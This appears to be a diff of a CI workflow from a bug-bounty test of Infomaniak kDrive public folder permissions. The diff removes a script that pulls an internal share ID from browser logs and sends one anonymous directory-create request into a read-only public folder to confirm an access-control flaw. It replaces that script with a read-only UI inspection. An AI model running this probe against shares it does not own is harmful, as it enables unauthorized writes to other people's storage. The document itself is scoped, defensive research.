@@ -1,4 +1,4 @@
-name: kDrive public folder one-write canary
+name: kDrive read-only public folder UI inspection
 
 on:
   push:
@@ -8,19 +8,18 @@ permissions:
   contents: read
 
 jobs:
-  one-write:
+  ui-inspection:
     runs-on: ubuntu-latest
     env:
       KDRIVE_TOKEN: ${{ secrets.KDRIVE_TOKEN }}
     steps:
-      - name: Install dependencies
+      - name: Install browser dependencies
         run: python -m pip install --quiet requests selenium
 
-      - name: Derive actual public API share id and attempt one gated create
+      - name: Inspect anonymous read-only share controls
         shell: python
         run: |
           import json, os, re, sys, time
-          from urllib.parse import urlparse
           import requests
           from selenium import webdriver
           from selenium.webdriver.chrome.options import Options
@@ -29,73 +28,52 @@ jobs:
           if not token: print('[STOP] missing token');sys.exit(2)
           print(f'::add-mask::{token}')
           drive_id=3896576; folder_id=19
-          ua='kDrive-YWH-public-folder-canary/1.0 Infomaniak-YWH-Bugbounty'
+          ua='kDrive-YWH-public-folder-ui/1.0 Infomaniak-YWH-Bugbounty'
           auth={'Authorization':f'Bearer {token}','User-Agent':ua,'Accept':'application/json'}
 
           meta=requests.get(f'https://api.infomaniak.com/3/drive/{drive_id}/files/{folder_id}',headers=auth,params={'with':'sharelink'},timeout=30)
-          try:mo=meta.json()
-          except Exception: print(f'[STOP] owner meta HTTP={meta.status_code} non_json');sys.exit(0)
-          sd=(mo.get('data') or {}).get('sharelink') or {}; share_url=sd.get('url'); owner_caps=sd.get('capabilities') or {}
-          print(f"[SHARE_POLICY] owner_meta_HTTP={meta.status_code} can_edit={str(owner_caps.get('can_edit')).lower()}")
-          if not share_url or owner_caps.get('can_edit') is not False:
-              print('[STOP] expected read-only public share not present');sys.exit(0)
+          mo=meta.json();sd=(mo.get('data') or {}).get('sharelink') or {};share_url=sd.get('url');caps=sd.get('capabilities') or {}
+          print(f"[POLICY] can_edit={str(caps.get('can_edit')).lower()} can_download={str(caps.get('can_download')).lower()}")
+          if not share_url or caps.get('can_edit') is not False:
+              print('[STOP] expected read-only share absent');sys.exit(0)
           print(f'::add-mask::{share_url}')
 
-          # Load the public share in a clean browser only to discover the exact share id used by its successful /init API call.
           opts=Options();opts.add_argument('--headless=new');opts.add_argument('--no-sandbox');opts.add_argument('--disable-dev-shm-usage');opts.add_argument('--disable-gpu')
           opts.set_capability('goog:loggingPrefs',{'performance':'ALL'})
           driver=webdriver.Chrome(options=opts)
-          api_share_id=None
           try:
-              driver.get(share_url); time.sleep(6)
+              driver.get(share_url);time.sleep(7)
+              # Record public capability values from the same browser response without exposing share ids.
+              cap_values=[]
               for entry in driver.get_log('performance'):
                   try:msg=json.loads(entry['message'])['message']
                   except Exception:continue
-                  if msg.get('method')!='Network.requestWillBeSent':continue
-                  req=(msg.get('params') or {}).get('request') or {}; url=req.get('url') or ''
-                  m=re.search(r'/2/app/'+str(drive_id)+r'/share/([^/]+)/init(?:\?|$)',url)
-                  if m:
-                      api_share_id=m.group(1); print(f'::add-mask::{api_share_id}'); print(f'::add-mask::{url}'); break
+                  if msg.get('method')!='Network.responseReceived':continue
+                  p=msg.get('params') or {};resp=p.get('response') or {};url=resp.get('url') or ''
+                  if f'/3/app/{drive_id}/share/' in url and f'/files/{folder_id}' in url and int(resp.get('status') or 0)==200:
+                      rid=p.get('requestId')
+                      try:
+                          rb=driver.execute_cdp_cmd('Network.getResponseBody',{'requestId':rid});raw=rb.get('body','')
+                          obj=json.loads(raw);data=obj.get('data') or {};pc=data.get('capabilities') or {}
+                          for k in ('can_edit','can_write','can_create_directory','can_create_file','can_upload','can_delete','can_rename','can_move'):
+                              if k in pc:cap_values.append((k,pc.get(k)))
+                      except Exception:pass
+              for k,v in cap_values:print(f'[PUBLIC_CAP] {k}={str(v).lower()}')
+
+              # Inspect visible actionable elements only; no clicks or mutations.
+              candidates=[]
+              for el in driver.find_elements('css selector','button,[role="button"],a,input'):
+                  try:
+                      if not el.is_displayed():continue
+                      text=' '.join(filter(None,[el.text,el.get_attribute('aria-label'),el.get_attribute('title'),el.get_attribute('value')])).strip()
+                      low=text.lower()
+                      if any(x in low for x in ('new folder','create folder','upload','add file','new file','import','create')):
+                          candidates.append((el.tag_name,text[:120],el.is_enabled()))
+                  except Exception:pass
+              print(f'[UI] write_like_visible_controls={len(candidates)}')
+              for i,(tag,text,enabled) in enumerate(candidates[:20],1):
+                  safe=re.sub(r'[A-Za-z0-9_-]{32,}','<opaque>',text)
+                  print(f'[UI_CONTROL {i}] tag={tag} enabled={str(enabled).lower()} text={safe!r}')
+              print('[RESULT] UI_INSPECTION_COMPLETE no_mutation=true')
           finally:
               driver.quit()
-          if not api_share_id:
-              print('[STOP] browser did not expose successful public init route; no write sent');sys.exit(0)
-          print('[DISCOVERY] public_api_share_id_found=true')
-
-          public_base=f'https://kdrive.infomaniak.com/3/app/{drive_id}/share/{api_share_id}'
-          print(f'::add-mask::{public_base}')
-          public_headers={'User-Agent':ua,'Accept':'application/json'}
-
-          # Gate on exact public resource and capabilities.
-          pre=requests.get(f'{public_base}/files/{folder_id}',headers=public_headers,timeout=30)
-          try:po=pre.json()
-          except Exception: print(f'[STOP] public meta HTTP={pre.status_code} non_json');sys.exit(0)
-          pd=po.get('data') or {};pc=pd.get('capabilities') or {}
-          print(f"[PUBLIC_GATE] HTTP={pre.status_code} result={po.get('result')} can_edit={str(pc.get('can_edit')).lower()} can_write={str(pc.get('can_write')).lower()} can_create_directory={str(pc.get('can_create_directory')).lower()} can_upload={str(pc.get('can_upload')).lower()}")
-          if not (pre.status_code==200 and po.get('result')=='success' and pc.get('can_edit') is False and pc.get('can_write') is False and pc.get('can_create_directory') is True):
-              print('[STOP] suspicious capability gate not satisfied; no write sent');sys.exit(0)
-
-          # Exactly one anonymous mutation, in our own controlled shared folder.
-          canary=f'ywh-anon-create-canary-{int(time.time())}'
-          endpoint=f'{public_base}/files/{folder_id}/directory'
-          print(f'::add-mask::{endpoint}')
-          wr=requests.post(endpoint,headers={**public_headers,'Content-Type':'application/json'},json={'name':canary,'only_for_me':False},timeout=30)
-          print(f'[ANON_CREATE] HTTP={wr.status_code}')
-          try:wo=wr.json()
-          except Exception:
-              print('[ANON_CREATE] non_json=true body_not_printed=true');sys.exit(0)
-          we=wo.get('error') or {};wd=wo.get('data') or {};created_id=wd.get('id') if isinstance(wd,dict) else None
-          print(f"[ANON_CREATE] result={wo.get('result')} code={we.get('code')} reason={we.get('reason')} created_id={created_id}")
-
-          # Independent owner verification.
-          lst=requests.get(f'https://api.infomaniak.com/3/drive/{drive_id}/files/{folder_id}/files',headers=auth,timeout=30)
-          try:lo=lst.json()
-          except Exception: print(f'[VERIFY] HTTP={lst.status_code} non_json');sys.exit(0)
-          items=lo.get('data') or [];matches=[x for x in items if isinstance(x,dict) and x.get('name')==canary]
-          owner_seen=bool(matches);verified_id=matches[0].get('id') if matches else None
-          print(f'[VERIFY] HTTP={lst.status_code} owner_sees_canary={str(owner_seen).lower()} verified_id={verified_id}')
-
-          if wo.get('result')=='success' and owner_seen:
-              print('[RESULT] ANONYMOUS_CREATE_CONFIRMED_IN_CAN_EDIT_FALSE_PUBLIC_FOLDER')
-          else:
-              print('[RESULT] ANONYMOUS_CREATE_NOT_CONFIRMED')
